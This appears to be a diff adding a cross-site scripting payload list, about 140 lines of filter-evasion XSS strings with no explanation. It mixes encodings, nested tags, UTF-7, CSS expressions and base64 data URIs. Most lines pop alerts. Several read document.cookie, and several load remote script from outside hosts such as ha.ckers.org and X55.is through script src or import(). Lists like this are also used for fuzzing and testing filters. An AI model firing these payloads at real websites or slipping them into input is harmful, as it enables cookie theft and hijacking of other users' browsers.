@@ -1,0 +1,140 @@
+<style>*{background-image:url('\6A\61\76\61\73\63\72\69\70\74\3A\61\6C\65\72\74\28\6C\6F\63\61\74\69\6F\6E\29')}</style>
+<fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074/test/>
+<fieldset//%00//onsite OnMoUsEoVeR=\u0061\u006C\u0065\u0072\u0074`1`>
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+JavaScript://%250Aalert?.(1)//
+'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->
+</Title/</Style/</Script/</textArea/</iFrame/</noScript>
+<iframe width="1000px" height="450px" src="https://amoloht.github.io" onload=alert("test")>
+<svg on=x// //onload=\u0065\u0076\u0061\u006C("alert`/test/`")>
+<body//%09%09////.//onmousemove='&#112;&#114;&#111;&#109;&#112;&#116;&lpar;&quot;&#65;&#109;&#111;&#108;&#111;&#72;&#84;&quot;&rpar;'//>
+x"//oNeRrOr=`/test/`
+""onerror=javascript:alert('test')
+"><u>XSS By test</u><marquee+onstart='alert(document.cookie)'>XSS
+<noscript><p title="</noscript><img src=x  onerror=alert(/test/)>">
+<svg onload=alert%26%230000000040"1")>
+<Svg/Onload=top%5B"al"%2B"ert%5D(1)//
+<sc<script>ript>alert(1)</sc</script>ript>
+<Svg Id=JavaScrip OnLoad=location=id+'t:/*'+URL>
+<svg><set onbegin=d=document,b='`',d['loca'+'tion']='javascript&colon;aler'+'t'+b+domain+b>
+<svg><set onbegin=d=document,b=/`/.source,d[/loca/.source+/tion/.source]=/javascript&colon;aler/.source+/t/.source+b+domain+b>
+`/alert?.(1)'"><Svg/OnLoad='`
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<var onmouseover="prompt(1)">On Mouse Over</var>
+<a/href="/alert(/test/)/">
+<a href=//X55.is autofocus onfocus=import(href)>
+<a href=javascript:'\74svg/onload\75alert\501\51\76'>
+<a href="javas%09cript:[1].map(top['ale'+'rt'])">
+<a href="/*">*/)});function+__MobileAppList(){alert(/test/)}//>
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnQW1vbG9IVCAnKTwvc2NyaXB0Pg==)
+<Img Src="//X55.is/> "OnError=import(src)//
+<Img Src="javascript:alert(/test/)> 1"OnError=location=src//
+javascript:&#37&#54&#49lert(/test/)
+javascript:%26%2337%26%2354%26%2349lert(/test/)
+JavaScript%26%2358confirm(1)
+JavaScript%26%2358AB:confirm(1)
+JavaScript%26%2358%0Bconfirm(1)
+JavaScript%26%2358$;confirm(1)
+JavaScript%26%2358$?confirm(1):0
+Set.constructor('ale'+'rt(13)')();
+<script>alert(/test/)</script>
+'><ScripT>alert(/test/)</SCripT>
+<svg><desc><![CDATA[</desc><script>alert(/test/)</script>]]></svg>
+JavaScript%26%2358top?confirm(1):0
+JavaScript://%250Aalert?.(1)//
+<Tag OnEvent="alert/*>*/(1)"
+<Svg OnLoad=confirm(1)>%C0%BCSvg%C0%A0OnLoad%C0%BDconfirm%C0%A81%C0%A9%C0%BE
+<Svg OnLoad=import('//X55.is')>%C0%BCSvg%C0%A0OnLoad%C0%BDimport%C0%A8%C0%A7%C0%AF%C0%http://AFX55.is%C0%A7%C0%A9%C0%BE
+function/**/Date(){alert(/test/)}
+function/**/RegExp(){alert(/test/)}
+/*-/*`/*\`/*'/*"/**/(/**/oNclick=alert())//%0D%0A%0D%0a//</style/</title/</textarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
++ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
+%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
++ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
+%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
+%253cscript%253ealert(document.cookie)%253c/script%253e
+“><s”%2b”cript>alert(document.cookie)</script>
+“><ScRiPt>alert(document.cookie)</script>
+“><<script>alert(document.cookie);//<</script>
+foo<script>alert(document.cookie)</script>
+<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
+<IMG STYLE="xss:expr/*XSS*/ession(alert('test'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("test"))'>
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('test');\")";eval(a+b+c+d+e);
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<form id="test" /><button form="test" formaction="javascript:alert(/test/23)">TESTHTML5FORMACTION
+<form><button formaction="javascript:alert(/test/23)">crosssitespt
+<frameset onload=alert(/test/23)>
+<!--<img src="--><img src=x onerror=alert(/test/23)//">
+<style><img src="</style><img src=x onerror=alert(/test/23)//">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="javascript:alert(/test/)">
+javascript:alert%281%29;
+<w contenteditable id=x onfocus=alert()>
+alert;pg("test")
+<svg/onload=%26%23097lert%26lpar;1337)>
+<script>for((i)in(self))eval(i)(1)</script>
+<scr<script>ipt>alert(/test/)</scr</script>ipt><scr<script>ipt>alert(/test/)</scr</script>ipt>
+<sCR<script>iPt>alert(/test/)</SCr</script>IPt>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
+%253Cscript%253Ealert('test')%253C%252Fscript%253E
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/') </script
+<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(/test/)"&#11;&#10;&#09;;>
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+http://www.google<script .com>alert(document.location)</script
+\x3Cscript>javascript:alert(/test/)</script>
+'"`><script>/* *\x2Fjavascript:alert(/test/)// */</script>
+<script>javascript:alert(/test/)</script\x0D
+<script>javascript:alert(/test/)</script\x0A
+<script>javascript:alert(/test/)</script\x0B
+<script charset="\x22>javascript:alert(/test/)</script>
+<script>javascript:alert(/test/)<\x00/script>
+<img src=# onerror\x3D"javascript:alert(/test/)" >
+<input onfocus=javascript:alert(/test/) autofocus>
+<input onblur=javascript:alert(/test/) autofocus><input autofocus>
+<video poster=javascript:javascript:alert(/test/)//
+<body onscroll=javascript:alert(/test/)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<form id=test onforminput=javascript:alert(/test/)><input></form><button form=test onformchange=javascript:alert(/test/)>X
+<video><source onerror="javascript:javascript:alert(/test/)">
+<video onerror="javascript:javascript:alert(/test/)"><source>
+<form><button formaction="javascript:javascript:alert(/test/)">X
+<body oninput=javascript:alert(/test/)><input autofocus>
+<math href="javascript:javascript:alert(/test/)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(/test/)">CLICKME</maction> </math>
+<frameset onload=javascript:alert(/test/)>
+<table background="javascript:javascript:alert(/test/)">
+<!--<img src="--><img src=x onerror=javascript:alert(/test/)//">
+<comment><img src="</comment><img src=x onerror=javascript:alert(/test/))//">
+<![><img src="]><img src=x onerror=javascript:alert(/test/)//">
+<style><img src="</style><img src=x onerror=javascript:alert(/test/)//">
+<li style=list-style:url() onerror=javascript:alert(/test/)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(/test/)></div>
+<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(/test/)//#">XXX</a></body>
+<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(/test/)</SCRIPT>
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+<script /**/>/**/alert(/test/)/**/</script /**/
+&#34;&#62;<h1/onmouseover='\u0061lert(/test/)'>
+<iframe/src="data:text/html,<svg &#111;&#110;load=alert(/test/)>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(/test/)" http-equiv="refresh"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
+</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
+<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
+<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(/test/)"&#11;&#10;&#09;;>
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+http://www.google<script .com>alert(document.location)</script
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<img/src=@&#32;&#13; onerror = prompt('&#49;')
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
